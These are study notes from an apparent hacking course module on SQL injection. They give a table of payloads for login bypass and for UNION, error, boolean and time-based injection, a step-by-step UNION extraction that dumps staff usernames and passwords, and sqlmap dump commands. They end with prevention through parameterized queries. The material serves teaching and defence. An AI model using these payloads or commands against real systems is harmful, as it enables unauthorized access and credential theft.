# SQL Injection (SQLi) -: Module 16

SQL Injection is one of the oldest and still most damaging web vulnerabilities — it's essentially a way of tricking a database into treating user-supplied data as executable code instead of plain text. These notes cover the core logic, the SQL fundamentals needed to understand it, the different injection types, a full walkthrough of a real exploitation, and how to automate and prevent it.

---

## 1. Core Logic of SQL Injection

Consider a typical login query:

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$password';
```

If an attacker enters `' OR 1=1 --` as the username, the query effectively becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...';
```

Two things make this work:

- **`OR 1=1`** — this condition is *always* true, regardless of what the actual username is.
- **`--`** — this is a SQL comment marker. Everything after it (including the password check) is ignored by the database entirely.

**Plain-language version:** think of the database as a strict gatekeeper checking two things — "is the username correct?" AND "is the password correct?" The `OR 1=1` payload doesn't bypass the gate by guessing the right password — it changes the *question itself* to "is the username correct, OR is 1 equal to 1?" Since 1 always equals 1, the gate opens regardless of what else was asked. The `--` then deletes the rest of the question before the database can even consider the password.

**A simpler test first:** before trying to bypass anything, attackers often just type a single quote (`'`) into an input box. If the page responds with a database/syntax error, the input is being inserted directly into a query without sanitization — a strong signal that SQL injection is possible. If the page behaves normally, the input is likely properly handled.

---

## 2. SQL Fundamentals Refresher

A solid grip on basic SQL syntax is what makes SQLi payloads click. These are the operations attackers lean on most.

### LIKE — Partial Matching with Wildcards

The `%` wildcard lets you match values that start with, end with, or contain certain characters.

```sql
SELECT * FROM users WHERE username LIKE 'a%';   -- starts with "a"
SELECT * FROM users WHERE username LIKE '%n';    -- ends with "n"
SELECT * FROM users WHERE username LIKE '%mi%';  -- contains "mi"
```

| Query | Matches |
|---|---|
| `LIKE 'a%'` | `admin` (anything starting with "a") |
| `LIKE '%n'` | `jon`, `admin`, `martin` (anything ending in "n") |
| `LIKE '%mi%'` | `admin` (anything containing "mi") |

### UNION — Combining Results From Multiple Queries

`UNION` merges the output of two or more `SELECT` statements into a single result set. The catch: both queries must return the **same number of columns**, of **compatible data types**, in the **same order**.

**Analogy:** A company wants one combined mailing list built from two separate tables — `customers` and `suppliers`, both of which happen to have the same shape (name/company, address, city, postcode):

```sql
SELECT name, address, city, postcode FROM customers
UNION
SELECT company, address, city, postcode FROM suppliers;
```

This returns one unified list containing every row from both tables. **This exact mechanism — gluing the results of an unrelated query onto a legitimate one — is what makes UNION-based SQL injection possible** (covered in detail in Section 5).

### INSERT — Adding a Row

```sql
INSERT INTO users (username, password) VALUES ('bob', 'password123');
```

`(username, password)` specifies which columns are being filled; `VALUES (...)` provides the matching data in the same order.

### UPDATE — Modifying Existing Rows

```sql
UPDATE users SET username = 'root', password = 'pass123' WHERE username = 'admin';
```

The `WHERE` clause determines exactly which row(s) get changed — omit it, and **every row in the table gets updated.**

### DELETE — Removing Rows

```sql
DELETE FROM users WHERE username = 'martin';   -- removes just that one row
DELETE FROM users;                              -- removes EVERY row (no WHERE clause!)
```

> **Why this matters for SQLi:** a missing or bypassed `WHERE` clause is exactly what an injected `OR 1=1` aims to produce — turning a query that was meant to target one specific row into one that matches (or destroys) all of them.

---

## 3. Types of SQL Injection

SQL injection is generally grouped into three categories, based on how the attacker receives the results of the injected query.

### In-Band SQL Injection (easiest to detect and exploit)

The attacker uses the **same communication channel** both to launch the attack and to retrieve the results — e.g., injecting a payload into a web page and seeing the stolen data appear directly on that same page. In-Band has two main sub-types:

- **Error-Based** — the database's own error messages are printed directly to the browser, often revealing enough structural detail (table names, column names) to enumerate the whole database just from error text.
- **Union-Based** — uses the `UNION` operator (Section 2) to append additional, attacker-chosen results onto the page's normal output. This is the most common technique for extracting large volumes of data through SQLi, and is walked through step-by-step in Section 5.

### Blind SQL Injection

No data or error message is returned directly — the attacker has to infer information indirectly:

- **Boolean-Based** — ask the database true/false questions and watch how the page's behavior changes (e.g., does the page render differently when the condition is true vs. false?).
- **Time-Based** — force a deliberate delay (`SLEEP(5)`) when a condition is true; if the response takes 5 seconds longer, the condition held — confirming the injection point without needing any visible output.

### Out-of-Band SQL Injection

Relies on the database server making an outbound connection (e.g., DNS or HTTP request) to exfiltrate data through a completely separate channel — used when neither direct output nor timing differences are available to the attacker.

---

## 4. Common SQLi Payloads

| Type | Payload Example | Purpose |
|---|---|---|
| **Auth Bypass** | `' OR '1'='1` | Bypass a login screen by forcing the query to always evaluate true |
| **Union-Based** | `' UNION SELECT 1,2,database() --` | Append results from other tables/queries onto the legitimate output |
| **Error-Based** | `' AND 1=(SELECT COUNT(*) FROM users) --` | Force a database error that leaks structural information |
| **Boolean-Based** | `' AND (SELECT SUBSTR(user,1,1) FROM users)='a'` | Extract data one character at a time by asking true/false questions |
| **Time-Based** | `' OR IF(1=1, SLEEP(5), 0) --` | Confirm an injection point by measuring response delay rather than visible output |

### Quick Symbol Reference

| Symbol | Meaning |
|---|---|
| `'` (single quote) | Used to break out of/terminate the intended string and start injecting SQL |
| `OR 1=1` | Forces the surrounding logic to always evaluate as true |
| `--` or `#` | Comments out the rest of the original query, hiding any remaining checks |
| `UNION` | Appends a second, attacker-controlled result set onto the original query's output |

---

## 5. Comment-Based Injection: A URL Example

```
https://website.thm/blog?id=2;--
```

This turns the backend query:

```sql
SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
```

into, effectively, just:

```sql
SELECT * FROM blog WHERE id=2;--
```

The semicolon signals the end of the SQL statement, and `--` comments out everything that follows — including the `AND private=0` check. The result: the attacker retrieves blog post `id=2` regardless of whether it was actually marked private.

---

## 6. UNION-Based SQLi — Full Exploitation Walkthrough

This is the step-by-step process for actually extracting hidden data once a UNION-based injection point has been found.

### Step 1: Determine the Number of Columns

UNION requires both queries to return the same number of columns, so the first job is figuring out how many the original query uses — done by trial and error:

```sql
1 UNION SELECT 1            -- error: column mismatch
1 UNION SELECT 1,2          -- error: column mismatch
1 UNION SELECT 1,2,3        -- success: no error
```

Once the error disappears, the column count is confirmed — in this case, **3**.

### Step 2: Suppress the Real Data (the `ID=0` Trick)

Most front-end code only displays the *first* result row. If the request still targets a valid ID (e.g., `id=1`), the page will keep showing the original article instead of the injected data.

By instead requesting an ID that doesn't exist (`0 UNION SELECT 1,2,3`), the original query returns nothing — forcing the page to fall back to displaying the injected UNION result instead.

### Step 3: Extract the Database Name

Replace one of the placeholder numbers with the SQL function `database()`:

```sql
0 UNION SELECT 1,2,database()
```

Wherever `3` was previously displayed on the page, the actual database name now appears instead.

### Step 4: Enumerate Tables and Columns via `information_schema`

Every SQL database maintains a built-in "master directory" called `information_schema` — a complete map of every table and column that exists.

**Finding table names:**

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

**Finding column names for a specific table:**

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

This reveals, for example, that the database contains tables like `article` and `staff_users`, and that `staff_users` has columns `id`, `username`, and `password`.

### Step 5: Extract the Data

With the table and column names known, the final payload pulls the actual credentials:

```sql
0 UNION SELECT 1,2,group_concat(username, ':', password) FROM staff_users
```

The result, printed directly to the page, looks like: `admin:pass123, martin:martin789`.

### Why `group_concat()` Is Necessary

A natural question at this stage: why not just `SELECT username, password FROM staff_users` directly? The answer comes down to two limitations on the page itself:

1. **Front-end limitation** — the page's code is typically written to display only the *first* row of whatever result set comes back, regardless of how many rows the database actually returns.
2. **Display space** — the page usually has just one designated text area (e.g., a title field) to show the injected output, so even if the database sends back ten rows, only one would normally be visible.

`group_concat()` solves this by **merging every matching row into a single long string** (e.g., `"article, staff_users, products"`) — which the page then happily displays in full inside that one text field, since as far as the page knows, it's just one long value, not multiple rows.

**Alternative when `group_concat()` isn't usable:** use `LIMIT` to manually page through results one row at a time:

```sql
... LIMIT 0,1   -- first result
... LIMIT 1,1   -- second result
... LIMIT 2,1   -- third result
```

This works but is far more tedious, since it requires re-running the query once per row.

### Summary Table

| Step | Action | Why |
|---|---|---|
| `SELECT 1,2,3` | Count the columns | UNION requires matching column counts |
| `ID = 0` | Suppress the real result | Forces the page to fall back to the injected data |
| `database()` | Extract the DB name | Identifies which database is in use |
| `information_schema` | Enumerate structure | Reveals table names and column names |
| `FROM staff_users` + `group_concat()` | Extract real data | Pulls usernames/passwords as one combined string |

---

## 7. Automating SQLi: sqlmap

**sqlmap** is an open-source penetration testing tool that automates the entire process of detecting and exploiting SQL injection — everything covered manually in Section 6 can be done with a single command.

> **Legal note:** Only run sqlmap against systems you own or have explicit written permission to test (e.g., TryHackMe, HackTheBox, or your own local lab). Unauthorized use is illegal.

### Common Commands

**Simple scan:**

```bash
sqlmap -u "http://example.com/products.php?id=10" --batch
```
- `-u` — specifies the target URL
- `--batch` — automatically accepts sqlmap's default choices instead of prompting interactively

**List available databases:**

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

**Dump a specific table's data:**

```bash
sqlmap -u "http://example.com/page.php?id=1" -D db_name -T users --dump
```
- `-D` — target database
- `-T` — target table
- `--dump` — download and display the extracted data

**Testing a POST-based form (e.g., a login page):**

Save the captured HTTP request to a file (`req.txt`), then run:

```bash
sqlmap -r req.txt --level=3 --risk=2
```

---

## 8. Prevention: Parameterized Queries

The real fix for SQL injection isn't smarter input filtering — filters can always be bypassed with a new encoding or trick. The actual fix is **Parameterized Queries** (also called **Prepared Statements**).

Instead of building a SQL string by directly concatenating user input into it, the query *template* is sent to the database first, and the user's input is sent **separately**, strictly as data. The database engine never interprets that input as part of the executable query structure — no matter what characters it contains.

**Core principle:**

$$ \text{Query} + \text{Data} \neq \text{Executable Command} $$

This is why parameterized queries close off SQL injection at the root, rather than trying to catch every possible malicious pattern after the fact.

---

## Key Takeaways / Exam Summary

- SQL injection works by breaking a query's intended logic — most commonly via `OR 1=1` (always-true condition) combined with `--` (comments out the rest of the query).
- A single quote (`'`) causing a database error is the classic first signal that an input field is vulnerable.
- Know the **three SQLi categories**: **In-Band** (Error-Based, Union-Based — same channel for attack and result), **Blind** (Boolean-Based, Time-Based — inferred indirectly), and **Out-of-Band** (data exfiltrated via a separate channel like DNS).
- **UNION-based exploitation** follows a fixed sequence: count columns → suppress real output (`id=0`) → extract `database()` → enumerate `information_schema` → pull real data with `group_concat()`.
- `group_concat()` exists to work around front-end pages that only display a single result row — it merges multiple rows into one string so the page displays them all at once.
- **sqlmap** automates the entire manual process above — `--dbs` lists databases, `-D`/`-T` target a specific database/table, `--dump` extracts the data, and `-r` tests a saved POST request.
- The only real fix is **parameterized queries / prepared statements** — separating the query structure from user-supplied data so input can never be interpreted as executable SQL.
